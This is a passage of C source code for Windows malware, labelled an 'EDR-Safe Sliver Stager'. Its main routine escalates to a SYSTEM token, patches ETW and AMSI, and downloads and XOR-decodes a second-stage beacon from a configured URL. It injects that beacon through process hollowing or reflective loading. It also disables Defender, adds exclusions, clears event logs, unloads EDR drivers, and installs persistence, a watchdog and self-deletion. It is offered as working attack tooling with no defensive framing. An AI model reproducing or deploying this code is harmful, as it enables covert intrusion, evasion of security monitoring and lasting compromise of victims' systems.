    PVOID pEntryPoint = (PBYTE)pImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    
    if (pNtHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) {
        DllMain_t DllMain = (DllMain_t)pEntryPoint;
        DllMain((HINSTANCE)pImageBase, DLL_PROCESS_ATTACH, NULL);
    } else {
        ExeEntry_t ExeEntry = (ExeEntry_t)pEntryPoint;
        ExeEntry((HINSTANCE)pImageBase, NULL, GetCommandLineA(), SW_SHOWDEFAULT);
    }
    
    return TRUE;
}

// ============================================================================
// MAIN - Complete Rewrite
// ============================================================================

int main(int argc, char* argv[]) {
    LOGV("[*] EDR-Safe Sliver Stager v3.0\n");
    const BOOL bBeaconStateful = IsBeaconStatefulTrackingEnabled();
    LOGV("[*] Build config: spawn_mode=%d system_injection=%d persistence=%d persistence_mode=%d watchdog=%d strict=%d fallback_to_user=%d disk_staged=%d standalone=%d proc_hollow=%d inprocess_reflect=%d beacon_stateful=%d\n",
        STAGE_SPAWN_MODE, STAGE_SYSTEM_INJECTION, STAGE_PERSISTENCE, STAGE_PERSISTENCE_MODE,
        STAGE_WATCHDOG, STAGE_SYSTEM_STRICT, STAGE_SYSTEM_FALLBACK_TO_USER,
        STAGE_ALLOW_DISK_STAGED_EXECUTION, STAGE_SYSTEM_STANDALONE,
        STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED, STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK,
        bBeaconStateful ? 1 : 0);

    BOOL bPersistentRuntime = FALSE;
    for (int i = 1; i < argc; i++) {
        if (IsPersistentRuntime(argv[i])) {
            bPersistentRuntime = TRUE;
            break;
        }
    }

    char stagerPath[MAX_PATH] = { 0 };
    char effectiveStagerPath[MAX_PATH] = { 0 };
    GetModuleFileNameA(NULL, stagerPath, MAX_PATH);
    _snprintf(effectiveStagerPath, sizeof(effectiveStagerPath), "%s", stagerPath);

    if (effectiveStagerPath[0] && effectiveStagerPath[0] != '\0') {
        _snprintf(stagerPath, sizeof(stagerPath), "%s", effectiveStagerPath);
    }
    
    if (!stagerPath[0]) {
        LOGE("[-] Failed to resolve runtime stager path.\n");
        return 1;
    }
    
    // Stage 0: Anti-sandbox
    if (CheckSandbox()) {
        LOGE("[-] Sandbox detected, exiting\n");
        return 0;
    }
    
    LOGV("[+] Sandbox checks passed\n");

    ULONGLONG ullNow = GetCurrentUnixTime();
    if (IsExistingBeaconActive(ullNow)) {
        LOGV("[*] Existing active beacon/stager instance detected. Exiting to prevent duplicate launches.\n");
        return 0;
    }

    if (bBeaconStateful) {
        BOOL bStateMarkerReady = WriteBeaconStateMarkerForCurrentStager();
        if (!bStateMarkerReady) {
            LOGV("[-] Failed to initialize stager marker file.\n");
        }
    }
    BOOL bEnablePersistence = (STAGE_PERSISTENCE != 0);
    BOOL bEnableWatchdog = (STAGE_WATCHDOG != 0);
    
    // Stage 1: SYSTEM token attempt (opt-in, disabled unless STAGE_SYSTEM_INJECTION=1)
    BOOL bIsSystem = FALSE;
    HANDLE hSystemToken = NULL;
    char runtimeCandidatePath[MAX_PATH] = { 0 };
#if STAGE_SYSTEM_INJECTION
    if (GetSystem(&hSystemToken)) {
        bIsSystem = TRUE;
        LOGV("[+] SYSTEM token acquired from candidate SYSTEM process\n");
        if (!EnableSystemProcessPrivileges()) {
            LOGV("[*] Cannot enable SYSTEM process-creation privileges (may still work if privileges are pre-assigned)\n");
        }
    } else if (ElevatePrivileges()) {
        LOGV("[+] Privileges elevated (SeDebugPrivilege)\n");
    } else {
        if (IsStrictSystemMode()) {
            LOGE("[*] SYSTEM token not acquired and strict mode is enabled.\n");
            LOGV("[*] SYSTEM token not acquired and strict mode is enabled.\n");
        } else {
            LOGE("[*] SYSTEM token not acquired; continuing with user-mode execution path.\n");
            LOGV("[*] SYSTEM token not acquired; continuing with user-mode execution path.\n");
        }
    }
#else
    if (ElevatePrivileges()) {
        LOGV("[+] Privileges elevated (SeDebugPrivilege)\n");
    } else {
        LOGV("[*] Running with current privileges\n");
    }
#endif
    if (STAGE_SYSTEM_INJECTION && IsStrictSystemMode() && !bIsSystem) {
        LOGE("[-] STAGE_SYSTEM_STRICT is enabled but SYSTEM context is unavailable. Exiting before payload processing.\n");
        return 1;
    }

    if (!BuildPersistentStagerImagePath(runtimeCandidatePath, sizeof(runtimeCandidatePath), hSystemToken)) {
        runtimeCandidatePath[0] = '\0';
    }

    if (!bPersistentRuntime && STAGE_PERSISTENCE != 0) {
        char persistentStagerPath[MAX_PATH] = { 0 };
        if (runtimeCandidatePath[0]) {
            _snprintf(persistentStagerPath, sizeof(persistentStagerPath), "%s", runtimeCandidatePath);
        }
        if (CopyStagerToPersistentPath(stagerPath, persistentStagerPath, sizeof(persistentStagerPath), hSystemToken)) {
            if (_stricmp(persistentStagerPath, stagerPath) != 0) {
                char launchLine[MAX_PATH * 2] = { 0 };
                if (_snprintf(
                        launchLine,
                        sizeof(launchLine),
                        "\"%s\" " STAGE_PERSISTENT_STAGER_RUNTIME_ARGUMENT,
                        persistentStagerPath
                    ) > 0) {
                    STARTUPINFOA si = { 0 };
                    PROCESS_INFORMATION pi = { 0 };
                    si.cb = sizeof(si);
                    si.dwFlags = STARTF_USESHOWWINDOW;
                    si.wShowWindow = SW_HIDE;

                    if (CreateProcessA(NULL, launchLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                        bPersistentRuntime = TRUE;
                        CloseHandle(pi.hThread);
                        CloseHandle(pi.hProcess);

                        LOGV("[+] Relaunched into persistent runtime path %s\n", persistentStagerPath);
                        if (ScheduleSelfDelete(stagerPath)) {
                            LOGV("[+] Scheduled bootstrap cleanup for %s\n", stagerPath);
                        } else {
                            LOGV("[-] Failed to schedule bootstrap cleanup for %s\n", stagerPath);
                        }

                        return 0;
                    } else {
                        LOGV("[-] Failed to relaunch into persistent runtime path %s (%lu)\n", persistentStagerPath, GetLastError());
                    }
                }
            } else {
                bPersistentRuntime = TRUE;
                _snprintf(effectiveStagerPath, sizeof(effectiveStagerPath), "%s", persistentStagerPath);
            }
        } else {
            LOGV("[-] Could not prepare persistent stager runtime copy; continuing with bootstrap path.\n");
        }
    }

    if (effectiveStagerPath[0] && effectiveStagerPath[0] != '\0') {
        _snprintf(stagerPath, sizeof(stagerPath), "%s", effectiveStagerPath);
    }

    if (runtimeCandidatePath[0] &&
        LoadRuntimeSwapStateFromManifest(runtimeCandidatePath)) {
        LOGV("[*] Pending runtime swap manifest found for %s\n", runtimeCandidatePath);
        if (ProcessRuntimeSwapManifest(hSystemToken)) {
            LOGV("[+] Processed pending runtime swap manifest.\n");
        } else {
            LOGV("[*] Runtime swap manifest processing deferred in this invocation.\n");
        }
    }
    
    VX_TABLE vxTable;
    if (!InitializeVxTable(&vxTable)) {
        LOGE("[-] VX Table initialization failed\n");
        return 1;
    }
    LOGV("[+] VX Table initialized\n");
    
    // Patch ETW & AMSI
    PatchETW();
    PatchAMSI();
    LOGV("[+] ETW/AMSI patched\n");
    
    // Stage 2: Download beacon
    DWORD dwStage2Size = 0;
    LPCSTR lpStage2Url = STAGE2_URL;
    if (IsLikelyPlaceholderUrl(lpStage2Url)) {
        LOGV("[-] STAGE2_URL appears to be a placeholder. Falling back to hardcoded default: %s\n", STAGE2_URL_DEFAULT);
        lpStage2Url = STAGE2_URL_DEFAULT;
    }
    if (!lpStage2Url || !*lpStage2Url) {
        LOGE("[-] Invalid stage2 URL: empty value\n");
        return 1;
    }
    if (strncmp(lpStage2Url, "http://", 7) != 0 && strncmp(lpStage2Url, "https://", 8) != 0) {
        LOGE("[-] Invalid stage2 URL: expected http:// or https://\n");
        return 1;
    }
    PBYTE pStage2 = DownloadStage2(lpStage2Url, &dwStage2Size);
    
    if (!pStage2 || dwStage2Size == 0) {
        LOGE("[-] Stage2 download failed\n");
        return 1;
    }
    
    LOGV("[+] Stage2 downloaded: %lu bytes\n", dwStage2Size);
    
    // Decode payload
    PBYTE pStage2Payload = NULL;
    DWORD dwStage2PayloadSize = 0;
    BOOL bAllocatedPayload = FALSE;
    BYTE xorKey[16] = { 0 };

    if (!ParseHexBytes(STAGE2_XOR_KEY_TEXT, xorKey, STAGE_ARRAY_COUNT(xorKey))) {
        LOGE("[-] STAGE2_XOR_KEY is invalid (expected 32 hex chars)\n");
        SecureZeroMemory(pStage2, dwStage2Size);
        VirtualFree(pStage2, 0, MEM_RELEASE);
        return 1;
    }
    
    if (!DecodeStage2Payload(pStage2, dwStage2Size, &pStage2Payload, 
        &dwStage2PayloadSize, xorKey, &bAllocatedPayload)) {
        LOGE("[-] Stage2 decode failed\n");
        SecureZeroMemory(pStage2, dwStage2Size);
        VirtualFree(pStage2, 0, MEM_RELEASE);
        return 3;
    }
    
    LOGV("[+] Stage2 decoded: %lu bytes\n", dwStage2PayloadSize);

    if (bIsSystem) {
        LOGV("[*] SYSTEM privileges obtained, hardening environment...\n");
#if STAGE_DISABLE_EDR_HARDENING
        LOGV("[*] EDR hardening intentionally disabled at compile time.\n");
#else
        if (!DisableDefenderViaServiceDependency(hSystemToken)) {
            LOGV("[-] SERVICE dependency hardening failed for WinDefend\n");
        }
        if (!AddDefenderExclusions(hSystemToken)) {
            LOGV("[-] Defender exclusions hardening failed\n");
        }
        if (!ClearSpecificEventLogs(hSystemToken)) {
            LOGV("[-] Event log hardening failed\n");
        }
        if (!UnloadEDRDrivers(hSystemToken)) {
            LOGV("[-] EDR driver/service hardening not completed\n");
        } else {
            LOGV("[+] SYSTEM environment hardening completed\n");
        }
#endif
    }

    if (bIsSystem && stagerPath[0]) {
        if (!HardenPersistentStagerImage(stagerPath)) {
            LOGV("[-] Could not harden active stager runtime image %s in SYSTEM context.\n", stagerPath);
        }
    }
    
    // Stage 3: Execute payload in safer SYSTEM path first, then fallback.
    gBeaconImplantPid = 0;
    const BOOL bStrictSystemMode = IsStrictSystemMode();
    const BOOL bAllowSystemDiskFallback = STAGE_ALLOW_DISK_STAGED_EXECUTION != 0;
    const BOOL bSystemMode = STAGE_SYSTEM_INJECTION != 0;
    const BOOL bPayloadIsPE = IsValidPePayload(pStage2Payload, dwStage2PayloadSize);
    BOOL bInjected = FALSE;
    BOOL bAllowUserFallback = (!STAGE_SYSTEM_INJECTION) || (STAGE_SYSTEM_FALLBACK_TO_USER && !bStrictSystemMode);
    BOOL bAllowStandaloneFallback = bSystemMode && bIsSystem &&
        bAllowSystemDiskFallback && STAGE_SYSTEM_STANDALONE;

    if (bSystemMode && !bIsSystem) {
        LOGE("[*] SYSTEM mode requested but SYSTEM token not acquired yet. Fallback user mode enabled: %s\n",
            bAllowUserFallback ? "yes" : "no");
        LOGV("[*] SYSTEM mode requested but SYSTEM token not acquired yet. Fallback user mode enabled: %s\n",
            bAllowUserFallback ? "yes" : "no");
    }
    if (bStrictSystemMode && STAGE_SYSTEM_INJECTION && STAGE_SYSTEM_FALLBACK_TO_USER) {
        LOGE("[*] SYSTEM strict mode is enabled; user fallback is disabled by policy.\n");
        LOGV("[*] SYSTEM strict mode is enabled; user fallback is disabled by policy.\n");
    }
    if (bStrictSystemMode && STAGE_SYSTEM_INJECTION) {
        LOGE("[*] SYSTEM strict mode is enabled; disk-backed standalone fallbacks are disabled by policy.\n");
        LOGV("[*] SYSTEM strict mode is enabled; disk-backed standalone fallbacks are disabled by policy.\n");
    }

    if (bSystemMode && bIsSystem) {
        LOGE("[*] SYSTEM mode flag active; bIsSystem=true. Entering primary SYSTEM execution path.\n");
        LOGV("[*] Attempting SYSTEM process launch path...\n");
        bInjected = RunStage2AsSystem(hSystemToken, pStage2Payload, dwStage2PayloadSize);
        if (!bInjected) {
            LOGE("[*] SYSTEM process launch failed.\n");
            LOGV("[*] SYSTEM process launch failed.\n");
        }
    }

    if (!bInjected && bSystemMode && bAllowUserFallback && STAGE_SYSTEM_FALLBACK_TO_USER && !bStrictSystemMode) {
        LOGE("[*] SYSTEM path failed. Attempting user-mode fallback execution...\n");
        LOGV("[*] SYSTEM path failed. Attempting user-mode fallback execution...\n");
        if (!bPayloadIsPE) {
            LOGE("[*] Attempting user-mode injection...\n");
            LOGV("[*] Attempting user-mode injection...\n");
            bInjected = HollowAndInject(pStage2Payload, dwStage2PayloadSize, FALSE);
        }
        if (!bInjected) {
            LOGE("[*] User-mode fallback injection failed. Trying user-mode process launch...\n");
            LOGV("[*] User-mode fallback injection failed. Trying user-mode process launch...\n");
            bInjected = LaunchStage2Process(pStage2Payload, dwStage2PayloadSize);
        }
    }

    if (!bInjected && !bSystemMode) {
        LOGE("[*] Running in user-mode profile; entering user-mode launch path.\n");
        LOGV("[*] Running in user-mode profile; entering user-mode launch path.\n");
        if (!bPayloadIsPE) {
            LOGE("[*] Attempting user-mode injection...\n");
            LOGV("[*] Attempting user-mode injection...\n");
            bInjected = HollowAndInject(pStage2Payload, dwStage2PayloadSize, FALSE);
        }
        if (!bInjected) {
            LOGE("[*] User-mode standalone execution...\n");
            LOGV("[*] User-mode standalone execution...\n");
            bInjected = LaunchStage2Process(pStage2Payload, dwStage2PayloadSize);
        }
    }

    if (!bInjected && bAllowStandaloneFallback) {
        LOGE("[*] SYSTEM standalone path failed. Trying SYSTEM standalone process launch.\n");
        LOGV("[*] SYSTEM standalone path failed. Trying SYSTEM standalone process launch.\n");
        bInjected = LaunchStage2ProcessWithToken(hSystemToken, pStage2Payload, dwStage2PayloadSize);
        if (!bInjected && STAGE_SYSTEM_FALLBACK_TO_USER && !bStrictSystemMode) {
            LOGE("[*] SYSTEM standalone launch failed. Trying user-mode standalone launch due fallback flag.\n");
            LOGV("[*] SYSTEM standalone launch failed. Trying user-mode standalone launch due fallback flag.\n");
            bInjected = LaunchStage2Process(pStage2Payload, dwStage2PayloadSize);
        }
    }

    if (bInjected) {
#if STAGE_PERSISTENCE
        if (bEnablePersistence) {
            BOOL bPersistenceInstalled = FALSE;

            if (bIsSystem && hSystemToken) {
                LOGV("[*] Attempting persistence install with SYSTEM token first\n");
                bPersistenceInstalled = CreatePersistenceAsSystemToken(hSystemToken, stagerPath);
                if (!bPersistenceInstalled) {
                    LOGV("[*] SYSTEM-token persistence attempt failed, trying current token context fallback\n");
                }
            }

            if (!bPersistenceInstalled) {
                bPersistenceInstalled = CreatePersistence(stagerPath);
            }

            if (bPersistenceInstalled) {
                LOGV("[+] Persistence established\n");
            } else {
                LOGE("[-] Persistence install failed\n");
            }
        }
#else
        LOGV("[*] Persistence disabled in this build\n");
#endif

        #if STAGE_WATCHDOG
        if (bEnableWatchdog) {
            BOOL bWatchdogAttempted = FALSE;
            BOOL bWatchdogInstalled = FALSE;

            if (bIsSystem && hSystemToken) {
                LOGV("[*] Attempting watchdog install with SYSTEM token first\n");
                bWatchdogAttempted = TRUE;
                bWatchdogInstalled = CreateWatchdogAsSystemToken(hSystemToken, stagerPath);
                if (!bWatchdogInstalled) {
                    LOGV("[*] SYSTEM-token watchdog attempt failed, trying current token context fallback\n");
                }
            }

            if (!bWatchdogInstalled) {
                bWatchdogAttempted = TRUE;
                bWatchdogInstalled = InstallWatchdog(stagerPath);
            }

            if (bWatchdogInstalled) {
                LOGV("[+] Watchdog scheduled for relaunch checks\n");
                if (bIsSystem && hSystemToken) {
                    if (!LaunchWatchdogNowWithToken(hSystemToken)) {
                        LOGV("[-] Watchdog run-now failed under SYSTEM token\n");
                    }
                } else {
                    LaunchWatchdogNow(stagerPath);
                }
            } else {
                if (bWatchdogAttempted) {
                    LOGV("[*] Watchdog failed to install, but this is non-fatal. Beacon launch continues.\n");
                } else {
                    LOGV("[*] Watchdog disabled at runtime configuration\n");
                }
                LOGV("[-] Watchdog install failed\n");
            }
        }
        #else
        LOGV("[*] Watchdog disabled in this build\n");
        #endif

        if (bBeaconStateful && !WriteBeaconStateMarkerWithPids(gBeaconImplantPid, GetCurrentProcessId())) {
            LOGV("[-] Failed to write beacon state marker (pid=%lu)\n", gBeaconImplantPid);
        }
        if (!bPersistentRuntime) {
            if (ScheduleSelfDelete(stagerPath)) {
                LOGV("[+] Scheduled self-delete for stager runtime binary.\n");
            } else {
                LOGV("[-] Failed to schedule stager self-delete.\n");
            }
        }
        LOGV("[+] Beacon implanted successfully\n");
        LOGV("[+] Stager exiting (beacon running independently)\n");
        
        // Cleanup
        SecureZeroMemory(pStage2, dwStage2Size);
        if (bAllocatedPayload) {
            SecureZeroMemory(pStage2Payload, dwStage2PayloadSize);
            VirtualFree(pStage2Payload, 0, MEM_RELEASE);
        }
        VirtualFree(pStage2, 0, MEM_RELEASE);
        if (hSystemToken) {
            CloseHandle(hSystemToken);
        }
        
        ExitProcess(0); // CLEAN EXIT
    }

    if (bSystemMode) {
        LOGE("[-] SYSTEM mode requested but all SYSTEM execution and fallback paths failed.\n");
        LOGE("[!] SYSTEM summary: bSystemMode=%d token_present=%d strict=%d fallback_to_user=%d standalone=%d disk_staged=%d hollowing=%d\n",
            bSystemMode, bIsSystem, bStrictSystemMode, bAllowUserFallback, bAllowStandaloneFallback, STAGE_ALLOW_DISK_STAGED_EXECUTION, STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED);
        if (bBeaconStateful && !WriteBeaconStateMarkerForCurrentStager()) {
            LOGV("[-] Failed to refresh marker after system launch failure.\n");
        }
        if (bAllocatedPayload) {
            SecureZeroMemory(pStage2Payload, dwStage2PayloadSize);
            VirtualFree(pStage2Payload, 0, MEM_RELEASE);
        }
        SecureZeroMemory(pStage2, dwStage2Size);
        VirtualFree(pStage2, 0, MEM_RELEASE);
        if (hSystemToken) {
            CloseHandle(hSystemToken);
        }
        return 1;
    }

    // Fallback: in-process reflective load only for non-PE shellcode payloads
    if (!bPayloadIsPE) {
        LOGV("[*] Injection failed, using reflective load fallback (non-PE payload).\n");
        if (ReflectiveLoadPE(pStage2Payload, dwStage2PayloadSize)) {
            LOGV("[+] Stage2 reflectively loaded\n");
            if (bAllocatedPayload) {
                SecureZeroMemory(pStage2Payload, dwStage2PayloadSize);
                VirtualFree(pStage2Payload, 0, MEM_RELEASE);
            }
            SecureZeroMemory(pStage2, dwStage2Size);
            VirtualFree(pStage2, 0, MEM_RELEASE);
            if (hSystemToken) {
                CloseHandle(hSystemToken);
            }
            return 0;
        }
    }
    LOGE("[-] Stage2 payload launch failed for current execution mode.\n");
    if (bBeaconStateful && !WriteBeaconStateMarkerForCurrentStager()) {
        LOGV("[-] Failed to refresh marker after launch failure.\n");
    }
    
    SecureZeroMemory(pStage2, dwStage2Size);
    if (bAllocatedPayload) {
        SecureZeroMemory(pStage2Payload, dwStage2PayloadSize);
        VirtualFree(pStage2Payload, 0, MEM_RELEASE);
    }
    VirtualFree(pStage2, 0, MEM_RELEASE);
    if (hSystemToken) {
        CloseHandle(hSystemToken);
    }
    
    return 0;
}
